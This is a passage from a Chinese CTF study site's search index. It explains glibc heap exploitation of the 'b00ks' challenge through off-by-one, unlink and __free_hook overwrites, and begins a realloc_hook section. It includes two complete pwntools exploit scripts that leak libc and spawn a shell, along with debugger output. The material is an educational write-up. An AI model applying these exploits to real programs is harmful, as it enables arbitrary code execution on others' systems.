\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728 description \u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2a book \u7ed3\u6784\uff0c\u8fd9\u4e2a book \u7ed3\u6784\u7684 description \u548c name \u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 \u8fd9\u91cc\u5728 description \u4e2d\u4f2a\u9020\u4e86 book \uff0c\u4f7f\u7528\u7684\u6570\u636e\u662f p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) \u3002 \u5176\u4e2d book1_addr+0x38 \u6307\u5411 book2 \u7684 book_name \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff1bbook1_addr+0x40 \u6307\u5411 book2 \u7684 book_desc \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 book2 \u6307\u9488\u503c\u3002 \u8fd9\u6837\u5c31\u662f\u5b9e\u73b0 edit book1 \u4fee\u6539 book2 \u6307\u9488\u5730\u5740\uff0cedit book2 \u4fee\u6539\u4efb\u610f\u5730\u5740 log . success ( \"book2_name_addr:\" + hex ( book1_addr + 0x38 )) log . success ( \"book2_desc_addr:\" + hex ( book1_addr + 0x40 )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) # write fakechunk","title":"\u4f2a\u9020\u7ed3\u6784\u4f53"},{"location":"Pwn/glibc-heap/off_by_one/#libc","text":"\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199 got \u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199 __malloc_hook \u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542f PIE \u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0f libc \u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2a book \u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5 mmap \u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662f brk \u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662f mmap \u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528 mmap \u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3a mmap \u5206\u914d\u7684\u5185\u5b58\u4e0e libc \u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u3002 pwndbg> x /4gx 0x0000555555758360 0x555555758360: 0x0000000000000002 0x00007ffff7fbc010 0x555555758370: 0x00007ffff7f9a010 0x0000000000021000 pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555556000 r-xp 2000 0 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555755000 0x555555756000 r--p 1000 1000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555756000 0x555555757000 rw-p 1000 2000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555757000 0x555555778000 rw-p 21000 0 [ heap ] 0x7ffff79e4000 0x7ffff7bcb000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7f9a000 0x7ffff7fe0000 rw-p 46000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [ vvar ] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [ vdso ] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [ stack ] 0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [ vsyscall ]","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"Pwn/glibc-heap/off_by_one/#__free_hook","text":"\u53ef\u4ee5\u5199\u5165 onegadget \u4e5f\u53ef\u4ee5\u662f system \uff0c\u5982\u679c\u662f system \uff0c\u9700\u8981 free \u7684 book_name \u662f /bin/sh \u6765\u4f20\u5165\u53c2\u6570\u3002","title":"\u5199\u5165 __free_hook"},{"location":"Pwn/glibc-heap/off_by_one/#exploit","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe\u3001CTF-WIKI # @Email : skye231@foxmail.com # @File : b00ks.py from pwn import * context . log_level = \"debug\" p = process ( \"./b00ks\" ) elf = ELF ( \"b00ks\" ) libc = ELF ( \"./libc.so.6\" ) def createbook ( name_size , name , des_size , des ): p . readuntil ( \"> \" ) p . sendline ( \"1\" ) p . readuntil ( \": \" ) p . sendline ( str ( name_size )) p . readuntil ( \": \" ) p . sendline ( name ) p . readuntil ( \": \" ) p . sendline ( str ( des_size )) p . readuntil ( \": \" ) p . sendline ( des ) def printbook ( id ): p . readuntil ( \"> \" ) p . sendline ( \"4\" ) p . readuntil ( \": \" ) for i in range ( id ): book_id = int ( p . readline ()[: - 1 ]) p . readuntil ( \": \" ) book_name = p . readline ()[: - 1 ] p . readuntil ( \": \" ) book_des = p . readline ()[: - 1 ] p . readuntil ( \": \" ) book_author = p . readline ()[: - 1 ] return book_id , book_name , book_des , book_author def createname ( name ): p . readuntil ( \"name: \" ) p . sendline ( name ) def changename ( name ): p . readuntil ( \"> \" ) p . sendline ( \"5\" ) p . readuntil ( \": \" ) p . sendline ( name ) def editbook ( book_id , new_des ): p . readuntil ( \"> \" ) p . sendline ( \"3\" ) p . readuntil ( \": \" ) p . writeline ( str ( book_id )) p . readuntil ( \": \" ) p . sendline ( new_des ) def deletebook ( book_id ): p . readuntil ( \"> \" ) p . sendline ( \"2\" ) p . readuntil ( \": \" ) p . sendline ( str ( book_id )) # leak chunk1_stuct addr createname ( \"A\" * 32 ) #gdb.attach(p,\"b *$rebase(0x0B94)\") createbook ( 128 , \"a\" * 8 , 32 , \"b\" * 8 ) createbook ( 0x21000 , \"/bin/sh \\x00 \" , 0x21000 , \"d\" * 8 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' )) log . success ( \"book1_address:\" + hex ( book1_addr )) # set fake chunk log . success ( \"book2_name_addr:\" + hex ( book1_addr + 0x38 )) log . success ( \"book2_desc_addr:\" + hex ( book1_addr + 0x40 )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) # overwrite chunk1_stuct addr 2 fake chunk changename ( \"A\" * 32 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book2_name_addr = u64 ( book_name . ljust ( 8 , \" \\x00 \" )) book2_des_addr = u64 ( book_des . ljust ( 8 , \" \\x00 \" )) log . success ( \"book2 name addr:\" + hex ( book2_name_addr )) log . success ( \"book2 des addr:\" + hex ( book2_des_addr )) libc_base = book2_des_addr - 0x5b6010 #0x5b9010 log . success ( \"libc base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ \"__free_hook\" ] log . success ( \"free_hook:\" + hex ( free_hook )) system = libc_base + libc . symbols [ \"system\" ] ''' ne_gadget=libc_base+0x4f3c2 #0x4f2c5 0x10a38c 0x4f322 log.success(\"one_gadget:\"+hex(one_gadget)) ''' # overwrite free_hook # set chunk2_desc 2 free_hook editbook ( 1 , p64 ( free_hook )) # overwrite free_hook 2 system editbook ( 2 , p64 ( system )) deletebook ( 2 ) p . interactive ()","title":"exploit"},{"location":"Pwn/glibc-heap/off_by_one/#ubuntu16","text":"book1 \u7ed3\u6784\u4f53\u8986\u76d6\u540e\u6307\u5411\u7684\u5730\u5740\u975e\u5e38\u4f4e\uff0c\u6307\u5411\u7684\u5730\u5740\u53d8\u6210\u662f\u5728\u4e00\u4e2a\u83ab\u540d\u5176\u5999\u7684 chunk \u91cc\u9762\u65e0\u6cd5\u5b9e\u73b0\u4f2a\u9020\u3002","title":"\u5728Ubuntu16\u4e0b\u51fa\u73b0\u60c5\u51b5"},{"location":"Pwn/glibc-heap/off_by_one/#unlink","text":"unlink\u5c31\u662fwiki\u4e0a\u7684\u7b80\u4fbf\u65b9\u6cd5 \u57fa\u4e8e\u524d\u9762 off-by-one \uff0c\u6216\u8005\u5177\u4f53\u4e00\u70b9\u662f off-by-null \uff0c\u6ea2\u51fa\u4e00\u4e2a\u7a7a\u5b57\u8282\uff0c\u603b\u7ed3\u4e00\u4e0b\u9898\u76ee\u60c5\u51b5\uff1a \u7a0b\u5e8f\u4e2d\u53ea\u8981\u8fd0\u7528\u5230\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570 my_read \u5c31\u4f1a\u5b58\u5728\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u6839\u636e\u5404\u4e2a\u51fd\u6570\u6709\u6240\u4e0d\u540c\uff1a\u5904\u7406 name \u4f1a\u6ea2\u51fa\u4e24\u4e2a\u5b57\u8282\uff0c\u5176\u4e2d\u4e00\u4e2a\u5b57\u8282\u662f\u53ef\u63a7\uff1b\u5176\u4ed6\u51fd\u6570\u4f1a\u9020\u6210 off-by-null \u3002 \u5982\u679c\u521a\u521a\u5165\u95e8\u5b66\u4e60 \u5806 \u9898\u76ee\uff0c\u8fd9\u91cc\u4f1a\u6bd4\u8f83\u7ed5\uff0c\u9700\u8981\u5230 CTF-wiki \u4e0a\u628a\u73b0\u4ee3 unlink \u653b\u51fb\u65b9\u6cd5\u4e86\u89e3\u4e00\u4e0b\u3002","title":"unlink"},{"location":"Pwn/glibc-heap/off_by_one/#_8","text":"\u6cc4\u9732 chunk \u5730\u5740\uff08\u8fd9\u6b65\u548c\u4e0a\u9762\u65b9\u6cd5\u4e00\u6837\uff09 \u8c03\u6574\u5806\u4e2d\u7ed3\u6784\uff0c\u4ee5\u4fbf\u5b8c\u6210 unlink \u3002\u5b8c\u6210\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u4fee\u6539 chunk 4 \u7684\u7ed3\u6784\u4f53\u3002 \u5c06 chunk 4 \u7ed3\u6784\u4f53\u4e24\u4e2a\u7ed3\u6784\u4f53\u6307\u9488\u5206\u522b\u6307\u5411 main_area \u548c chunk 6 *desc \uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6cc4\u9732 libc \u5730\u5740\u548c\u83b7\u5f97\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u7684\u6307\u9488\u3002 \u4fee\u6539 chunk6 *desc \u7684\u6307\u9488\u4e3a __free_hook \uff1b\u63a5\u7740\u4fee\u6539 __free_hook \u4e3a system \uff08\u6216 onegadget \uff09\u3002","title":"\u653b\u51fb\u8fc7\u7a0b\u6982\u8ff0"},{"location":"Pwn/glibc-heap/off_by_one/#chunk","text":"\u65b9\u6cd5\u8fd8\u662f\u548c\u524d\u9762\u4e00\u6837\uff0c\u5199\u5165 0x20 \u7684 author name \uff0c\u7136\u540e\u7533\u8bf7\u4e00\u4e2a chunk \u5c06 author name \u7684\u7ed3\u675f\u7b26\u8986\u76d6\u6389\u3002\u5c31\u80fd\u4ece author name \u6cc4\u9732 chunk \u5730\u5740\uff1a p . recvuntil ( \"author name: \" ) p . sendline ( \"skye\" . ljust ( 32 , 'a' )) create ( 0x20 , 'a' * 8 , 0x20 , 'b' * 8 ) #1 show ()","title":"\u6cc4\u9732 chunk \u5730\u5740"},{"location":"Pwn/glibc-heap/off_by_one/#_9","text":"\u6211\u4eec\u9700\u8981\u4f7f\u7528\u7684\u662f\u73b0\u4ee3 unlink \u9700\u8981\u4f2a\u9020 fd\u3001bk \u6307\u9488\u3002book name \u9650\u5b9a\u6700\u5927 size \u4e3a 0x20 \uff0c\u5c5e\u4e8e fastbin \u4e0d\u4f1a\u89e6\u53d1 unlink \u5408\u5e76\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u628a book 456 \u7684 desc \u5806\u5757\u5e03\u7f6e\u5230\u4e00\u8d77\u3002 create ( 0x20 , 'c' * 8 , 0x20 , 'd' * 8 ) #2 create ( 0x20 , 'e' * 8 , 0x20 , 'f' * 8 ) #3 remove ( 2 ) remove ( 3 ) \u7136\u540e\u7533\u8bf7 456 heap \uff1a create ( 0x20 , 'g' * 8 , 0x208 , 'h' * 8 ) #4 # make sure chunk5size low bit is 01,or corruption (!prev) create ( 0x20 , 'i' * 8 , 0x200 - 0x10 , 'j' * 8 ) #5 create ( 0x20 , \"/bin/sh \\x00 \" , 0x200 , 'k' * 8 ) #6 chunk4 chunk4 desc \u7528\u6765\u4f2a\u9020 fd\u3001bk\uff1b\u88ab\u4fee\u6539\u540e\u7684\u7ed3\u6784\u4f53\u7528\u6765\u4fee\u6539 chunk6 desc \u7684\u6307\u9488\uff0c\u5f62\u6210\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u3002 chunk4 \u7533\u8bf7\u7684\u65f6\u5019\u6ce8\u610f\u8981\u7528\u5230 next_chunk \u7684 prev_size \u4f4d\uff0c\u65b9\u4fbf\u6211\u4eec\u4f2a\u9020\u3002 chunk5 chunk5 desc \u9700\u8981 size \uff08\u542bchunk head\uff09\u6700\u4f4e\u4e24\u4e2a\u5b57\u8282\u4e3a 0x01 \uff0c\u5229\u7528 off-by-null \u8986\u76d6\u4e3a 0x00 \uff0cprev_inuse \u6807\u8bb0\u524d\u9762\u4e00\u4e2a chunk \u662f\u672a\u4f7f\u7528\u7684\u3002\u5982\u679c\u7533\u8bf7\u51fa\u6765\u7684 size \u4e0d\u7b26\u5408\u6807\u51c6\uff08eg\uff1a0x10\uff09\uff0cfree \u7684\u65f6\u5019\u4f1a\u62a5\u9519\uff1a double free or corruption (!prev) \u539f\u56e0\u5c31\u662f\u7cfb\u7edf\u6839\u636e\u5f53\u524d chunk size \u627e\u4e0b\u4e00\u4e2a chunk \u7684 prev_inuse \u6807\u5fd7\uff0c\u7136\u540e\u6211\u4eec\u8986\u76d6\u4e4b\u540e\u6539\u53d8\u7684\u4e0d\u53ea\u662f prev_inuse \u6574\u4e2asize \u90fd\u53d8\u4e86\uff0c\u627e\u5230\u7684 next_chunk \u4e5f\u662f\u9519\u7684\u3002 chunk6 \u7528\u6765\u4fee\u6539 __free_hook \u3002\u5982\u679c\u4f7f\u7528 system \u5c06 book name \u5199\u5165\u4e3a /bin/sh \u5c31\u884c\u4e86\uff1b\u4f7f\u7528 one_gadget \u4e0d\u9700\u8981\u3002","title":"\u8c03\u6574\u5806\u7ed3\u6784"},{"location":"Pwn/glibc-heap/off_by_one/#chunk4","text":"\u7528\u7684\u662f**\u73b0\u4ee3 unlink** \u5b9e\u73b0\u7684\u6548\u679c\u662f\uff1a *ptr = ptr-0x18 \u3002 ptr = heap_base + 0x1180 # target addr log . info ( \"ptr:\" + hex ( ptr )) payload = p64 ( 0 ) + p64 ( 0x201 ) + p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload += ' \\x00 ' * 0x1e0 + p64 ( 0x200 ) edit ( 4 , payload ) remove ( 5 ) # unlink *ptr = ptr-0x18 unlink \u4e4b\u540e chunk4 desc \u6307\u9488\u5c06\u4f1a\u6307\u5411\u7ed3\u6784\u4f53\u81ea\u8eab\u7684\u67d0\u4e2a\u5730\u65b9\uff0c\u5177\u4f53\u770b\u56fe\u8c03\u8bd5\uff1a","title":"\u5728 chunk4 \u5185\u4f2a\u9020\u4e00\u4e2a\u5806"},{"location":"Pwn/glibc-heap/off_by_one/#chunk4_1","text":"\u6211\u9009\u62e9\u5c06 book4 name \u4fee\u6539\u4e3a\u5b58\u50a8 libc \u7684\u5185\u5b58\u5730\u5740\uff08\u4e5f\u5c31\u662f book4 desc \u67d0\u5904\uff09\u3001book4 desc \u4fee\u6539\u4e3a chunk6 desc \u6307\u9488\u5730\u5740\u3002 payload = p64 ( 0x31 ) + p64 ( 0x4 ) + p64 ( heap_base + 0x11e0 ) + p64 ( heap_base + 0x10c0 ) edit ( 4 , payload ) show ()","title":"\u4fee\u6539chunk4\u7ed3\u6784\u4f53"},{"location":"Pwn/glibc-heap/off_by_one/#__free_hook_1","text":"payload = p64 ( free_hook ) edit ( 4 , payload ) payload = p64 ( system ) edit ( 6 , payload )","title":"\u4fee\u6539 __free_hook"},{"location":"Pwn/glibc-heap/off_by_one/#exp","text":"from pwn import * context . log_level = 'info' p = process ( \"./b00ks\" ) elf = ELF ( \"./b00ks\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( book_size , book_name , desc_size , desc ): p . recvuntil ( \">\" ) p . sendline ( str ( 1 )) p . sendlineafter ( \": \" , str ( book_size )) p . recvuntil ( \": \" ) p . sendline ( book_name ) p . recvuntil ( \": \" ) p . sendline ( str ( desc_size )) p . sendline ( desc ) def remove ( idx ): p . recvuntil ( \">\" ) p . sendline ( str ( 2 )) p . sendlineafter ( \": \" , str ( idx )) def edit ( idx , desc ): p . recvuntil ( \">\" ) p . sendline ( str ( 3 )) p . sendlineafter ( \": \" , str ( idx )) p . sendlineafter ( \": \" , str ( desc )) def show (): p . recvuntil ( \">\" ) p . sendline ( str ( 4 )) def author_name ( name ): p . recvuntil ( \">\" ) p . sendline ( str ( 5 )) p . sendlineafter ( \": \" , str ( name )) p . recvuntil ( \"author name: \" ) p . sendline ( \"skye\" . ljust ( 32 , 'a' )) create ( 0x20 , 'a' * 8 , 0x20 , 'b' * 8 ) #1 show () p . recvuntil ( \"skye\" . ljust ( 32 , 'a' )) first_heap = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"first_heap:\" + hex ( first_heap )) heap_base = first_heap - 0x1080 log . info ( \"heap_base:\" + hex ( heap_base )) create ( 0x20 , 'c' * 8 , 0x20 , 'd' * 8 ) #2 create ( 0x20 , 'e' * 8 , 0x20 , 'f' * 8 ) #3 remove ( 2 ) remove ( 3 ) create ( 0x20 , 'g' * 8 , 0x208 , 'h' * 8 ) #4 0x218 # make sure chunk5size low bit is 01,or corruption (!prev) create ( 0x20 , 'i' * 8 , 0x200 - 0x10 , 'j' * 8 ) #5 0x200 create ( 0x20 , \"/bin/sh \\x00 \" , 0x200 , 'k' * 8 ) #6 ptr = heap_base + 0x1180 # target addr log . info ( \"ptr:\" + hex ( ptr )) # fake chunk(0x200 2 chunk5) payload = p64 ( 0 ) + p64 ( 0x201 ) + p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload += ' \\x00 ' * 0x1e0 + p64 ( 0x200 ) edit ( 4 , payload ) # gdb.attach(p,\"b *$rebase(0x202018)\") remove ( 5 ) # unlink *ptr = ptr-0x18 # FD->chunk4 desc fd # BK->chunk6 struct desc payload = p64 ( 0x31 ) + p64 ( 0x4 ) + p64 ( heap_base + 0x11e0 ) + p64 ( heap_base + 0x10c0 ) edit ( 4 , payload ) show () p . recvuntil ( \"Name: \" ) p . recvuntil ( \"Name: \" ) main_area = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"main_area:\" + hex ( main_area )) libc_base = main_area - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ '__free_hook' ] log . info ( \"free_hook:\" + hex ( free_hook )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) payload = p64 ( free_hook ) edit ( 4 , payload ) payload = p64 ( system ) edit ( 6 , payload ) remove ( 6 ) p . interactive ()","title":"exp"},{"location":"Pwn/glibc-heap/off_by_one/#_10","text":"off-by-one \u601d\u8def\u4e2d\u901a\u8fc7\u7533\u8bf7\u4e00\u4e2a\u975e\u5e38\u5927\u7684 chunk \uff0c\u8ba9\u7a0b\u5e8f\u901a\u8fc7 mmap \u5206\u914d\u5185\u5b58\uff0c\u8be5\u5185\u5b58\u5730\u5740\u4e0e libc \u6709\u56fa\u5b9a\u504f\u79fb \u7a0b\u5e8f\u81ea\u52a8\u5206\u914d\u7684 \u7b2c\u4e00\u4e2a\u5806 \uff0c\u5728\u5e08\u5144\u63d0\u9192\u4e0b\u5927\u6982\u662f\u56e0\u4e3a\u7a0b\u5e8f\u6ca1\u6709\u521d\u59cb\u5316\u7f13\u51b2\u533a\uff0c\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u7533\u8bf7\u4e00\u4e2a\u5806\u7528\u4f5c\u7f13\u5b58\u533a\u3002 \u73b0\u4ee3 unlink \u6ee1\u8db3\u68c0\u67e5\u6761\u4ef6\uff1a fakeFD -> bk == P <=> *(fakeFD + 12) == P fakeBK -> fd == P <=> *(fakeBK + 8) == P \u5b9e\u73b0\u6548\u679c\uff1a *P = P - 8 *P = P - 12 P \u7684\u6307\u9488\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904 prev_size \u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f\uff08\u542b chunk head\uff09\uff0c\u7b80\u5355\u8ba1\u7b97\u65b9\u6cd5\uff1a\u4e0a\u4e00\u4e2a chunk \u6307\u9488\u51cf\u53bb next chunk \u6307\u9488\u7684\u503c\u3002 unlink \u601d\u8def\u4e2d\u8ba1\u7b97\u9519\u4e86 chunk \u5927\u5c0f\uff0c\u89e6\u53d1\u4e86 double free or corruption (!prev) \u3002\u6700\u540e\u67e5\u8bc1\u662f\u56e0\u4e3a\u88ab\u91ca\u653e chunk size \u88ab\u4fee\u6539\u9519\u8bef\uff0c\u5bfc\u81f4\u627e\u4e0d\u5230 next chunk \u7684 prev_inuse \u4fe1\u606f\u800c\u5bfc\u81f4\u62a5\u9519 \u6ca1\u6709\u627e\u5230 chunk \u7684\u6807\u5fd7\u4fe1\u606f RELRO: Full RELRO \u7a0b\u5e8f\u4e0d\u80fd\u4fee\u6539 got \u8868\uff0c\u6211\u4eec\u5c31\u53bb\u4fee\u6539 __malloc_hook\u3001__free_hook \u7b49 hook \u51fd\u6570\uff0c\u5177\u4f53\u539f\u7406\u53ef\u4ee5\u770b\u6e90\u7801\uff0c \u5728\u8fdb\u5165 malloc \u6216\u8005 free \u4f1a\u5148\u53bb\u67e5\u5bf9\u5e94\u7684 hook \u51fd\u6570\u662f\u5426\u4e0d\u4f1a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\u5219\u53bb\u6267\u884c hook \u6307\u5411\u7684\u51fd\u6570 \u3002 malloc \u7684\u53c2\u6570\u662f int \uff0c\u6240\u4ee5\u6539 malloc \u76f8\u5173\u51fd\u6570\u4e00\u822c\u6539\u4e3a onegadget free \u7684\u53c2\u6570\u662f \u5730\u5740\uff0c\u6240\u4ee5\u6539 free \u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u6539\u4e3a onegadget \u6216\u8005 system \u7136\u540e\u4f20\u5165 /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740 \u6700\u7b80\u5355\u7684\u662f\u5c31\u662f\u5229\u7528 off-by-one \u6cc4\u9732 Canary \u7684\u503c \u21a9 \u4e3e\u4e2a\u5229\u7528\u4e00\u4e2a\u88ab\u5206\u914d\u7684 chunk size \u4e3a 0x101 \uff0c\u8fd9\u662f prev_in_use \u6807\u8bb0\u8fd9\u4e2a chunk \u662f\u88ab\u4f7f\u7528\u72b6\u6001\uff0c\u5982\u679c\u5f53\u6211\u4eec off-by-null \u5c06size \u8986\u76d6\u4e3a 0x100 \uff0c\u90a3\u4e48\u8fd9\u4e2a chunk \u5c31\u88ab\u8ba4\u4e3a\u662f \u7a7a\u95f2\u72b6\u6001 \u21a9 off-by-null \u21a9 \u4e3a\u5565\u521a\u521a\u597d\u5c31\u662f\u5728 book1 desc \u91cc\u9762\uff1f\u901a\u8fc7\u8c03\u8bd5\u5457\u3002\u6ce8\u610f\u5728 Ubuntu 16 \u8fd9\u91cc\u65e0\u6cd5\u5b9e\u73b0\u6307\u5411 book1 desc \uff0c\u8bf7\u770b\u7ed3\u5c3e\u8865\u5145 \u21a9","title":"\u5c0f\u7ed3"},{"location":"Pwn/glibc-heap/realloc/","text":"\u901a\u8fc7 realloc_hook \u8c03\u6574\u6808\u5e27\u4f7f onegadget \u751f\u6548 \u00b6 \u5728\u67d0\u4e9b\u5806\u7684\u9898\u76ee\u5f53\u4e2d\uff0c\u7531\u4e8e\u9650\u5236\u53ea\u80fd\u4f7f\u7528 house of spirit \u7b49\u65b9\u6cd5\u52ab\u6301 malloc_hook \uff0c\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u662f\u5f80 malloc_hook \u5199\u5165 onegadget \uff0c\u518d\u6b21\u7533\u8bf7\u5806\u6765 getshell \u3002 \u7531\u4e8e\u6808\u5e27\u60c5\u51b5\u4e0d\u6ee1\u8db3\uff0c\u67e5\u8be2\u5230\u7684\u6240\u6709 onegadget \u53ef\u80fd\u90fd\u6253\u4e0d\u901a\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u8003\u8651\u4e0b\u7528 malloc_hook \u548c realloc_hook \u7ed3\u5408\u3002\u5148\u901a\u8fc7 realloc \u8c03\u6574\u6808\u5e27\uff0c\u7136\u540e\u5728\u8fd0\u884c onegadget \u3002 \u4e86\u89e3 realloc \u00b6 realloc \u5728\u5e93\u51fd\u6570\u4e2d\u7684\u4f5c\u7528\u662f\u91cd\u65b0\u8c03\u6574 malloc \u6216 calloc \u6240\u5206\u914d\u7684\u5806\u5927\u5c0f\u3002\u5b83\u548c malloc \u51fd\u6570\u4e00\u6837\u6709 hook \u51fd\u6570\uff0c\u5f53 hook \u51fd\u6570\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5c31\u4f1a\u8df3\u8f6c\u8fd0\u884c hook \u51fd\u6570\uff08\u548c malloc_hook \u4e00\u6837\u7684\uff09\u3002 __int64 __fastcall realloc ( signed __int64 a1 , unsigned __int64 a2 , __int64 a3 ) { \u2026\u2026 if ( _realloc_hook ) return _realloc_hook ( a1 , a2 , retaddr ); \u2026\u2026 \u770b\u770b realloc \u7684\u6c47\u7f16\u4ee3\u7801\uff1a\uff08\u53ef\u4ee5\u628a libc \u62d6\u5230 ida \u4e2d\u770b\uff0c\u4e5f\u53ef\u4ee5\u6cc4\u9732\u5730\u5740\u540e gdb \u8c03\u8bd5\u67e5\u770b x /20i [addr] \uff09 .text:00000000000846C0 realloc proc near ; DATA XREF: LOAD:0000000000006BA0\u2191o .text:00000000000846C0 ; __unwind { .text:00000000000846C0 push r15 ; Alternative name is '__libc_realloc' .text:00000000000846C2 push r14 .text:00000000000846C4 push r13 .text:00000000000846C6 push r12 .text:00000000000846C8 mov r13, rsi .text:00000000000846CB push rbp .text:00000000000846CC push rbx .text:00000000000846CD mov rbx, rdi .text:00000000000846D0 sub rsp, 38h .text:00000000000846D4 mov rax, cs:__realloc_hook_ptr .text:00000000000846DB mov rax, [rax] .text:00000000000846DE test rax, rax .text:00000000000846E1 jnz loc_848E8 ; \u8df3\u8f6c\u6267\u884c realloc_hook .text:00000000000846E7 test rsi, rsi .text:00000000000846EA jnz short loc_846F5 .text:00000000000846EC test rdi, rdi .text:00000000000846EF jnz loc_84960 \u51fd\u6570\u4e00\u5f00\u59cb\u6709\u5f88\u591a\u7684 push \uff0crealloc \u51fd\u6570\u5148\u6267\u884c push \u538b\u6808\uff0c\u7136\u540e\u5728\u8df3\u8f6c\u6267\u884c realloc_hook \u5b58\u50a8\u7684\u51fd\u6570\u3002\u6211\u4eec\u5c31\u662f\u5229\u7528\u8fd9\u4e9b push \u8c03\u6574\u6808\u5e27\u3002push 